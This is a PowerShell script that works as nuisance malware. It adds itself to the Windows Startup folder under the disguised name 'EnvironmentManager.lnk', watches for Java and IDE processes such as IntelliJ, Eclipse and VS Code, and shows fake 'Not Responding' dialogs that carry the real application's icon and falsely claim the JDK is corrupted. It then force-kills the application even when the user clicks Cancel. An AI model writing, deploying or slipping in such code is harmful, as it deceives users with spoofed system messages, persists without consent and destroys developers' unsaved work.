Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Add-ToStartup {
    param ([string]$ExePath)
    try {
        $startupFolder = [System.Environment]::GetFolderPath('Startup')
        $shortcutName = "EnvironmentManager.lnk"
        $shortcutPath = Join-Path $startupFolder $shortcutName
        $WshShell = New-Object -ComObject WScript.Shell
        $shortcut = $WshShell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = $ExePath
        $shortcut.WorkingDirectory = Split-Path $ExePath
        $shortcut.Save()
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($WshShell) | Out-Null
    }
    catch {}
}

function Show-TopmostMessageBox {
    param(
        [string]$Text,
        [string]$Caption,
        [System.Windows.Forms.MessageBoxButtons]$Buttons = [System.Windows.Forms.MessageBoxButtons]::OK,
        [System.Windows.Forms.MessageBoxIcon]$Icon = [System.Windows.Forms.MessageBoxIcon]::Information,
        [string]$ProcessName = $null,
        [bool]$ShowStopCode = $false
    )

    $useCustomIcon = $false
    $appIcon = $null
    if ($ProcessName) {
        try {
            $process = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($process -and $process.MainModule.FileName) {
                $appIcon = [System.Drawing.Icon]::ExtractAssociatedIcon($process.MainModule.FileName)
                $useCustomIcon = $true
            }
        }
        catch {
            $useCustomIcon = $false
        }
    }
    if ($useCustomIcon -and $appIcon) {
        try {
            Add-Type -TypeDefinition @"
            using System;
            using System.Runtime.InteropServices;
            public class SystemSound {
                [DllImport("user32.dll")]
                public static extern bool MessageBeep(uint uType);
            }
"@
            switch ($Icon) {
                ([System.Windows.Forms.MessageBoxIcon]::Warning) { [SystemSound]::MessageBeep(0x30) | Out-Null }
                ([System.Windows.Forms.MessageBoxIcon]::Error) { [SystemSound]::MessageBeep(0x10) | Out-Null }
                ([System.Windows.Forms.MessageBoxIcon]::Information) { [SystemSound]::MessageBeep(0x40) | Out-Null }
                ([System.Windows.Forms.MessageBoxIcon]::Question) { [SystemSound]::MessageBeep(0x20) | Out-Null }
                default { [SystemSound]::MessageBeep(0x30) | Out-Null }
            }
        }
        catch {
            [console]::Beep(1000, 30000)
        }
        $form = New-Object System.Windows.Forms.Form
        $form.Text = $Caption
        $form.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen
        $form.TopMost = $true
        $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
        $form.MaximizeBox = $false
        $form.MinimizeBox = $false
        $form.Icon = $appIcon
        $form.Size = New-Object System.Drawing.Size(480, 200)
        $form.ClientSize = New-Object System.Drawing.Size(470, 170)
        $iconBox = New-Object System.Windows.Forms.PictureBox
        $iconBox.Size = New-Object System.Drawing.Size(32, 32)
        $iconBox.Location = New-Object System.Drawing.Point(15, 15)
        $iconBox.Image = $appIcon.ToBitmap()
        $iconBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
        $form.Controls.Add($iconBox)
        $label = New-Object System.Windows.Forms.Label
        $label.Text = $Text
        $label.Location = New-Object System.Drawing.Point(55, 15)
        $label.Size = New-Object System.Drawing.Size(400, 85)
        $label.Font = New-Object System.Drawing.Font("Microsoft Sans Serif", 9)
        $form.Controls.Add($label)
        # Removed unrealistic stop code label
        if ($Buttons -eq [System.Windows.Forms.MessageBoxButtons]::YesNo) {
            $yesButton = New-Object System.Windows.Forms.Button
            $yesButton.Text = "OK"
            $yesButton.Location = New-Object System.Drawing.Point(280, 125)
            $yesButton.Size = New-Object System.Drawing.Size(75, 28)
            $yesButton.DialogResult = [System.Windows.Forms.DialogResult]::Yes
            $form.Controls.Add($yesButton)
            $noButton = New-Object System.Windows.Forms.Button
            $noButton.Text = "Cancel"
            $noButton.Location = New-Object System.Drawing.Point(365, 125)
            $noButton.Size = New-Object System.Drawing.Size(75, 28)
            $noButton.DialogResult = [System.Windows.Forms.DialogResult]::No
            $form.Controls.Add($noButton)
            $form.AcceptButton = $yesButton
            $form.CancelButton = $noButton
        } else {
            $okButton = New-Object System.Windows.Forms.Button
            $okButton.Text = "OK"
            $okButton.Location = New-Object System.Drawing.Point(365, 125)
            $okButton.Size = New-Object System.Drawing.Size(75, 28)
            $okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
            $form.Controls.Add($okButton)
            $form.AcceptButton = $okButton
        }
        $result = $form.ShowDialog()
        $form.Dispose()
        if ($appIcon) { $appIcon.Dispose() }
        return $result
    } else {
        $parentForm = New-Object System.Windows.Forms.Form
        $parentForm.WindowState = [System.Windows.Forms.FormWindowState]::Minimized
        $parentForm.ShowInTaskbar = $false
        $parentForm.TopMost = $true
        $parentForm.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual
        $parentForm.Location = New-Object System.Drawing.Point(-2000, -2000)
        $parentForm.Size = New-Object System.Drawing.Size(1, 1)
        try {
            $parentForm.Show()
            $parentForm.BringToFront()
            $parentForm.Activate()
            [System.Windows.Forms.Application]::DoEvents()
            $result = [System.Windows.Forms.MessageBox]::Show($parentForm, $Text, $Caption, $Buttons, $Icon)
            return $result
        }
        finally {
            $parentForm.Close()
            $parentForm.Dispose()
        }
    }
}

function Get-ApplicationName {
    param([string]$ProcessName)

    switch -Regex ($ProcessName) {
        "^java$|^javaw$" { return "Java Runtime Environment" }
        "^idea" { return "IntelliJ IDEA" }
        "^eclipse" { return "Eclipse IDE" }
        "^netbeans" { return "NetBeans IDE" }
        "^studio" { return "Android Studio" }
        "^code" { return "Visual Studio Code" }
        "^jdeveloper" { return "Oracle JDeveloper" }
        default { return "$ProcessName Application" }
    }
}

function Get-JavaOrIDEProcess {
    $processes = Get-Process | Where-Object {
        $_.ProcessName -match "java" -or
        $_.ProcessName -match "javaw" -or
        $_.ProcessName -match "idea" -or
        $_.ProcessName -match "eclipse" -or
        $_.ProcessName -match "netbeans" -or
        $_.ProcessName -match "studio" -or
        $_.ProcessName -match "code" -or
        $_.ProcessName -match "jdeveloper"
    }

    if ($processes.Count -gt 0) {
        return $processes[0].ProcessName
    }
    return $null
}

 $exePath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
 Add-ToStartup -ExePath $exePath
 while ($true) {
    $detectedProcess = $null

    while ($true) {
        $detectedProcess = Get-JavaOrIDEProcess
        if ($detectedProcess) {
            break
        }

        $randomCheck = Get-Random -Minimum 1500 -Maximum 3000
        Start-Sleep -Milliseconds $randomCheck
    }

    $delaySeconds = Get-Random -Minimum 10 -Maximum 20
    Start-Sleep -Seconds $delaySeconds

    $applicationName = Get-ApplicationName -ProcessName $detectedProcess

    $result = Show-TopmostMessageBox -Text "$applicationName is not responding.`n`nThe current JDK seems to be corrupted and is preventing the application from functioning properly.`n`nEnd the process to prevent system instability? (Recommended)" -Caption "$applicationName - Not Responding" -Buttons YesNo -Icon Warning -ProcessName $detectedProcess -ShowStopCode $true


    if ($result -eq [System.Windows.Forms.DialogResult]::Yes) {
        try {
            $null = Get-Process -Name $detectedProcess -ErrorAction Stop | Stop-Process -Force
            $null = Show-TopmostMessageBox -Text "$applicationName has been terminated successfully. Please install JDK 17 or above." -Caption "Program Terminated" -Buttons OK -Icon Information -ProcessName $detectedProcess
        }
        catch {
            $null = Show-TopmostMessageBox -Text "Failed to close $applicationName. The program may have already exited." -Caption "Close Error" -Buttons OK -Icon Warning -ProcessName $detectedProcess
        }
    } else {
        Start-Sleep -Seconds 3
        try {
            Stop-Process -Name $detectedProcess -Force -ErrorAction Stop
        }
        catch {}
    }

    $randomCooldown = Get-Random -Minimum 4 -Maximum 6
    Start-Sleep -Seconds $randomCooldown
}